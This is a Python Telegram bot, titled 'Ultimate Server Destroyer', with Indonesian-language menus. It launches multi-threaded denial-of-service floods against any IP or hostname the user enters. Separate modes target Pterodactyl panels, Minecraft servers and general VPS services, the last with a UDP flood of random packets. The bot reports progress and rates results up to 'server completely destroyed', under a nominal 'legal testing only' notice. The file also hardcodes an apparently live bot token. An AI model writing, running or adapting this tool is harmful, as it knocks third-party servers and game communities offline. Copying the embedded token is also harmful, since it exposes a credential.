import asyncio
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters
import threading
import time
import random
import socket
import requests
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
import urllib3

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
TARGET, PORT, THREADS, DURATION, CONFIRM = range(5)

class UltimateServerDestroyer:
    def __init__(self):
        self.target_ip = ""
        self.port = 80
        self.threads = 1000
        self.duration = 120
        self.attacking = False
        self.stats = defaultdict(int)
        self.attack_mode = "AUTO"
        self.current_attack = None

    def detect_service(self, ip, port):
        """Detect what service is running"""
        services = {
            2022: "Pterodactyl Panel",
            8080: "Pterodactyl Wings", 
            25565: "Minecraft Server",
            25575: "Minecraft RCON",
            80: "Web Server",
            443: "HTTPS Server",
            22: "SSH Service",
            3306: "MySQL Database",
            5432: "PostgreSQL"
        }
        
        if port in services:
            return services[port]
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                return "Unknown Service"
            else:
                return "Port Closed"
        except:
            return "Unknown"

    def pterodactyl_attack(self, worker_id):
        """Specialized Pterodactyl Panel Attack"""
        while self.attacking:
            try:
                endpoints = [
                    "/api/application/servers",
                    "/api/client",
                    "/api/application/users", 
                    "/api/application/nodes",
                    "/api/application/locations"
                ]
                
                headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'Accept': 'application/json',
                    'Authorization': 'Bearer ' + 'x' * 50,
                    'Content-Type': 'application/json'
                }
                
                for endpoint in endpoints:
                    try:
                        url = f"http://{self.target_ip}:{self.port}{endpoint}"
                        requests.get(url, headers=headers, timeout=1, verify=False)
                        self.stats['pterodactyl_req'] += 1
                    except:
                        pass
                
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.target_ip, 8080))
                    sock.send(b'GET / HTTP/1.1\r\n\r\n')
                    sock.close()
                    self.stats['wings_conn'] += 1
                except:
                    pass
                
                self.stats['total_requests'] += 1
                
            except:
                self.stats['failed_req'] += 1

    def minecraft_attack(self, worker_id):
        """Specialized Minecraft Server Attack"""
        while self.attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.port))
                
                packets = [
                    b'\x00\x00\x01\x00',
                    b'\x01\x00\x00\x00',
                    b'\x02\x00\x00\x00',
                    b'\xfe\x01\xfa\x00\x0b\x00\x4d\x00\x43\x00\x7c\x00\x50\x00\x69\x00\x6e\x00\x67\x00\x48\x00\x6f\x00\x73\x00\x74'
                ]
                
                for packet in packets:
                    try:
                        sock.send(packet + random._urandom(500))
                        self.stats['mc_packets'] += 1
                    except:
                        break
                
                sock.close()
                self.stats['mc_connections'] += 1
                
                try:
                    rcon_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    rcon_sock.settimeout(1)
                    rcon_sock.connect((self.target_ip, 25575))
                    rcon_sock.close()
                    self.stats['rcon_attempts'] += 1
                except:
                    pass
                
            except:
                self.stats['failed_req'] += 1

    def vps_attack(self, worker_id):
        """VPS Complete Destruction"""
        while self.attacking:
            try:
                services = [
                    (80, 'HTTP'), (443, 'HTTPS'), (22, 'SSH'), 
                    (21, 'FTP'), (25, 'SMTP'), (53, 'DNS'),
                    (3306, 'MySQL'), (5432, 'PostgreSQL'), (27017, 'MongoDB')
                ]
                
                for port, service in services:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((self.target_ip, port))
                        
                        if service == 'HTTP':
                            sock.send(b'GET / HTTP/1.1\r\n\r\n')
                        elif service == 'SSH':
                            sock.send(b'SSH-2.0-OpenSSH_8.0\r\n')
                        
                        sock.close()
                        self.stats[f'{service}_conn'] += 1
                        
                    except:
                        pass
                
                try:
                    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    for _ in range(10):
                        udp_sock.sendto(random._urandom(1400), (self.target_ip, random.randint(1000, 65535)))
                        self.stats['udp_packets'] += 1
                    udp_sock.close()
                except:
                    pass
                
                self.stats['total_operations'] += 1
                
            except:
                self.stats['failed_req'] += 1

    def auto_attack(self, worker_id):
        """Auto-detect and attack"""
        attacks = [self.pterodactyl_attack, self.minecraft_attack, self.vps_attack]
        attack_func = random.choice(attacks)
        attack_func(worker_id)

    def start_attack(self, attack_mode):
        """Start attack in separate thread"""
        self.attacking = True
        self.stats.clear()
        self.stats['start_time'] = time.time()
        self.attack_mode = attack_mode
        
        def run_attack():
            try:
                with ThreadPoolExecutor(max_workers=self.threads) as executor:
                    if attack_mode == "PTERODACTYL":
                        attack_func = self.pterodactyl_attack
                    elif attack_mode == "MINECRAFT":
                        attack_func = self.minecraft_attack
                    elif attack_mode == "VPS":
                        attack_func = self.vps_attack
                    else:
                        attack_func = self.auto_attack
                    
                    futures = [executor.submit(attack_func, i) for i in range(self.threads)]
                    
                    start_time = time.time()
                    while self.attacking and (time.time() - start_time) < self.duration:
                        time.sleep(1)
                    
                    self.attacking = False
                    
                    for future in futures:
                        try:
                            future.result(timeout=5)
                        except:
                            pass
                    
            except Exception as e:
                logger.error(f"Attack error: {e}")
                self.attacking = False

        attack_thread = threading.Thread(target=run_attack)
        attack_thread.daemon = True
        attack_thread.start()
        self.current_attack = attack_thread

    def stop_attack(self):
        """Stop current attack"""
        self.attacking = False
        if self.current_attack:
            self.current_attack.join(timeout=10)
        self.current_attack = None

    def get_stats(self):
        """Get current attack statistics"""
        if not self.attacking:
            return None
            
        elapsed = time.time() - self.stats['start_time']
        progress = min(100, (elapsed / self.duration) * 100)
        
        stats_text = f"""
🎯 Target: {self.target_ip}:{self.port}
💀 Mode: {self.attack_mode}
⏰ Elapsed: {elapsed:.1f}s / {self.duration}s
🔢 Threads: {self.threads}
📊 Progress: {progress:.1f}%

📨 Total Requests: {self.stats['total_requests']:,}
⚡ Total Operations: {self.stats['total_operations']:,}
        """
        
        if self.attack_mode == "PTERODACTYL":
            stats_text += f"\n🐦 Panel Requests: {self.stats.get('pterodactyl_req', 0):,}"
            stats_text += f"\n🦅 Wings Connections: {self.stats.get('wings_conn', 0):,}"
        elif self.attack_mode == "MINECRAFT":
            stats_text += f"\n⛏️ MC Connections: {self.stats.get('mc_connections', 0):,}"
            stats_text += f"\n🎮 MC Packets: {self.stats.get('mc_packets', 0):,}"
        elif self.attack_mode == "VPS":
            stats_text += f"\n📡 UDP Packets: {self.stats.get('udp_packets', 0):,}"
        
        return stats_text

# Global instance
destroyer = UltimateServerDestroyer()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send welcome message"""
    welcome_text = """
🚀 *ULTIMATE SERVER DESTROYER BOT*

*Fitur:*
• 🐦 Pterodactyl Panel Attack
• ⛏️ Minecraft Server Attack  
• 🖥️ VPS/Web Server Attack
• 🔥 Auto-detect Attack

*Perintah:*
/start - Menu utama
/attack - Mulai serangan
/stats - Lihat statistik
/stop - Hentikan serangan
/help - Bantuan

⚠️ *PERINGATAN:* Hanya gunakan untuk testing legal!
    """
    
    keyboard = [
        [InlineKeyboardButton("🚀 Start Attack", callback_data="start_attack")],
        [InlineKeyboardButton("📊 View Stats", callback_data="view_stats")],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "start_attack":
        await query.edit_message_text(
            "🎯 *Pilih jenis serangan:*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🐦 Pterodactyl", callback_data="mode_pterodactyl")],
                [InlineKeyboardButton("⛏️ Minecraft", callback_data="mode_minecraft")],
                [InlineKeyboardButton("🖥️ VPS/Web", callback_data="mode_vps")],
                [InlineKeyboardButton("🔥 Auto Detect", callback_data="mode_auto")],
                [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
            ])
        )
    
    elif query.data.startswith("mode_"):
        mode_map = {
            "mode_pterodactyl": "PTERODACTYL",
            "mode_minecraft": "MINECRAFT", 
            "mode_vps": "VPS",
            "mode_auto": "AUTO"
        }
        context.user_data['attack_mode'] = mode_map[query.data]
        await query.edit_message_text(
            "🔍 *Masukkan target IP/hostname:*\n\nContoh: `example.com` atau `192.168.1.1`",
            parse_mode='Markdown'
        )
        return TARGET
    
    elif query.data == "view_stats":
        stats = destroyer.get_stats()
        if stats:
            await query.edit_message_text(f"📊 *Attack Statistics*\n\n{stats}", parse_mode='Markdown')
        else:
            await query.edit_message_text("❌ Tidak ada serangan yang berjalan.")
    
    elif query.data == "stop_attack":
        if destroyer.attacking:
            destroyer.stop_attack()
            await query.edit_message_text("🛑 Serangan dihentikan!")
        else:
            await query.edit_message_text("❌ Tidak ada serangan yang berjalan.")
    
    elif query.data == "help":
        help_text = """
❓ *Bantuan Bot*

*Cara penggunaan:*
1. Klik 'Start Attack'
2. Pilih jenis serangan
3. Masukkan target IP/hostname
4. Masukkan port (opsional)
5. Atur jumlah threads
6. Atur durasi
7. Konfirmasi serangan

*Jenis Serangan:*
• 🐦 Pterodactyl - Serangan khusus panel Pterodactyl
• ⛏️ Minecraft - Serangan server Minecraft
• 🖥️ VPS/Web - Serangan multi-service
• 🔥 Auto - Deteksi otomatis

⚠️ *Legal Notice:* Hanya untuk testing sistem sendiri!
        """
        await query.edit_message_text(help_text, parse_mode='Markdown')
    
    elif query.data == "back_main":
        await start(update, context)

async def target_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle target input"""
    target = update.message.text.strip()
    
    try:
        if '://' in target:
            target = target.split('://')[1].split('/')[0]
        
        if target.replace('.', '').isdigit():
            destroyer.target_ip = target
        else:
            destroyer.target_ip = socket.gethostbyname(target)
        
        await update.message.reply_text(
            f"✅ *Target resolved:* `{destroyer.target_ip}`\n\n🔧 *Masukkan port* (default 80):",
            parse_mode='Markdown'
        )
        return PORT
        
    except Exception as e:
        await update.message.reply_text(f"❌ Gagal resolve target: {e}\nCoba lagi:")
        return TARGET

async def port_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle port input"""
    try:
        port_text = update.message.text.strip()
        if port_text:
            destroyer.port = int(port_text)
        else:
            destroyer.port = 80
            
        service = destroyer.detect_service(destroyer.target_ip, destroyer.port)
        await update.message.reply_text(
            f"🔍 *Service detected:* {service}\n\n🧵 *Masukkan jumlah threads* (default 1000):",
            parse_mode='Markdown'
        )
        return THREADS
        
    except ValueError:
        await update.message.reply_text("❌ Port harus angka! Coba lagi:")
        return PORT

async def threads_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle threads input"""
    try:
        threads_text = update.message.text.strip()
        if threads_text:
            destroyer.threads = int(threads_text)
        else:
            destroyer.threads = 1000
            
        await update.message.reply_text(
            f"⏰ *Masukkan durasi serangan (detik)* (default 120):",
            parse_mode='Markdown'
        )
        return DURATION
        
    except ValueError:
        await update.message.reply_text("❌ Threads harus angka! Coba lagi:")
        return THREADS

async def duration_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle duration input"""
    try:
        duration_text = update.message.text.strip()
        if duration_text:
            destroyer.duration = int(duration_text)
        else:
            destroyer.duration = 120
            
        # Show confirmation
        service = destroyer.detect_service(destroyer.target_ip, destroyer.port)
        confirm_text = f"""
🎯 *KONFIRMASI SERANGAN*

📍 Target: `{destroyer.target_ip}:{destroyer.port}`
🔧 Service: {service}
💀 Mode: {context.user_data['attack_mode']}
🧵 Threads: {destroyer.threads}
⏰ Durasi: {destroyer.duration} detik

⚠️ *Lanjutkan serangan?*
        """
        
        keyboard = [
            [InlineKeyboardButton("✅ Launch Attack", callback_data="confirm_attack")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")]
        ]
        
        await update.message.reply_text(
            confirm_text,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return CONFIRM
        
    except ValueError:
        await update.message.reply_text("❌ Durasi harus angka! Coba lagi:")
        return DURATION

async def confirm_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle attack confirmation"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "confirm_attack":
        attack_mode = context.user_data['attack_mode']
        
        # Start attack
        destroyer.start_attack(attack_mode)
        
        await query.edit_message_text(
            f"🚀 *ATTACK LAUNCHED!*\n\n"
            f"💀 Menyerang `{destroyer.target_ip}:{destroyer.port}`\n"
            f"⏰ Durasi: {destroyer.duration} detik\n"
            f"🧵 Threads: {destroyer.threads}\n\n"
            f"Gunakan /stats untuk melihat progress\n"
            f"Gunakan /stop untuk menghentikan",
            parse_mode='Markdown'
        )
        
        # Send periodic updates
        asyncio.create_task(send_attack_updates(context, query.message.chat_id))
        
    else:  # cancel
        await query.edit_message_text("❌ Serangan dibatalkan.")
    
    return ConversationHandler.END

async def send_attack_updates(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
    """Send periodic attack updates"""
    start_time = time.time()
    
    while destroyer.attacking and (time.time() - start_time) < destroyer.duration:
        await asyncio.sleep(10)  # Update every 10 seconds
        
        stats = destroyer.get_stats()
        if stats:
            try:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"📊 *Live Attack Update*\n\n{stats}",
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Failed to send update: {e}")
    
    # Final stats
    if not destroyer.attacking:
        total_impact = sum(v for k, v in destroyer.stats.items() if 'failed' not in k)
        
        if total_impact > 50000:
            status = "💀 SERVER COMPLETELY DESTROYED"
        elif total_impact > 20000:
            status = "🔥 CRITICAL DAMAGE"
        elif total_impact > 5000:
            status = "⚡ HEAVY IMPACT"
        elif total_impact > 1000:
            status = "💢 MODERATE IMPACT"
        else:
            status = "⚠️ MINOR IMPACT"
        
        final_text = f"""
📊 *ATTACK COMPLETED*

🎯 Target: {destroyer.target_ip}:{destroyer.port}
💀 Mode: {destroyer.attack_mode}
⏰ Duration: {destroyer.duration}s

📈 Total Impact: {total_impact:,} operations
📨 Requests: {destroyer.stats['total_requests']:,}
⚡ Operations: {destroyer.stats['total_operations']:,}

📊 *RESULT: {status}*
        """
        
        try:
            await context.bot.send_message(
                chat_id=chat_id,
                text=final_text,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Failed to send final stats: {e}")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send current attack statistics"""
    stats = destroyer.get_stats()
    if stats:
        await update.message.reply_text(f"📊 *Attack Statistics*\n\n{stats}", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ Tidak ada serangan yang berjalan.")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Stop current attack"""
    if destroyer.attacking:
        destroyer.stop_attack()
        await update.message.reply_text("🛑 Serangan dihentikan!")
    else:
        await update.message.reply_text("❌ Tidak ada serangan yang berjalan.")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation"""
    await update.message.reply_text("❌ Operasi dibatalkan.")
    return ConversationHandler.END

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Start attack conversation via command"""
    await update.message.reply_text(
        "🎯 *Pilih jenis serangan:*",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🐦 Pterodactyl", callback_data="mode_pterodactyl")],
            [InlineKeyboardButton("⛏️ Minecraft", callback_data="mode_minecraft")],
            [InlineKeyboardButton("🖥️ VPS/Web", callback_data="mode_vps")],
            [InlineKeyboardButton("🔥 Auto Detect", callback_data="mode_auto")]
        ])
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send help message"""
    help_text = """
❓ *Bantuan Bot*

*Perintah:*
/start - Menu utama
/attack - Mulai serangan
/stats - Lihat statistik
/stop - Hentikan serangan
/help - Bantuan ini

*Cara penggunaan:*
1. Gunakan /attack atau klik Start Attack
2. Pilih jenis serangan
3. Ikuti instruksi untuk setup target
4. Konfirmasi serangan

*Jenis Serangan:*
• 🐦 Pterodactyl - Serangan khusus panel Pterodactyl
• ⛏️ Minecraft - Serangan server Minecraft
• 🖥️ VPS/Web - Serangan multi-service
• 🔥 Auto - Deteksi otomatis

⚠️ *Legal Notice:* Hanya untuk testing sistem sendiri!
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

def main() -> None:
    """Start the bot."""
    # Ganti dengan token bot Anda
    TOKEN = "8486595586:AAFlX-bq3h2_2oQrTm-FX9ZXWFwvafa9nuA"
    
    # Create application dengan proper initialization
    application = Application.builder().token(TOKEN).build()

    # Conversation handler untuk attack setup
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^mode_")],
        states={
            TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, target_input)],
            PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, port_input)],
            THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, threads_input)],
            DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, duration_input)],
            CONFIRM: [CallbackQueryHandler(confirm_attack, pattern="^(confirm_attack|cancel_attack)$")]
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(button_handler))

    # Start the Bot
    print("Bot started! Press Ctrl+C to stop.")
    application.run_polling()

if __name__ == '__main__':
    main()